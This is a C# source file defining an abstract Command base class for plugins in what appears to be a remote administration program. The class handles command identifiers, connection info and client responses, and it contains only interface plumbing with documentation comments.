using System;

namespace Orcus.Administration.Plugins.CommandViewPlugin
{
    /// <summary>
    ///     A command registered by the administration
    /// </summary>
    public abstract class Command : IDisposable
    {
        private uint? _identifier;
        protected IConnectionInfo ConnectionInfo;

        /// <summary>
        ///     The command ID
        /// </summary>
        public uint Identifier => (_identifier ?? (_identifier = GetId())).Value;

        public virtual void Dispose()
        {
        }

        protected event EventHandler Loaded;

        /// <summary>
        ///     Process the response from the client
        /// </summary>
        /// <param name="parameter">The parameter without token</param>
        public abstract void ResponseReceived(byte[] parameter);

        /// <summary>
        ///     Initializes the command
        /// </summary>
        /// <param name="connectionInfo">Some information about the connection</param>
        public void Initialize(IConnectionInfo connectionInfo)
        {
            ConnectionInfo = connectionInfo;
            Loaded?.Invoke(this, EventArgs.Empty);
        }

        /// <summary>
        ///     Get a description of the given package
        /// </summary>
        /// <param name="data">The data of the package</param>
        /// <param name="isReceived">True if the package came from the client, false if the administration comes from this command</param>
        /// <returns>A short description of the package</returns>
        public virtual string DescribePackage(byte[] data, bool isReceived)
        {
            return null;
        }

        /// <summary>
        ///     Internally get the id of the command
        /// </summary>
        /// <returns>The id of the command. Please generate the id using the plugin id generator</returns>
        protected abstract uint GetId();
    }
}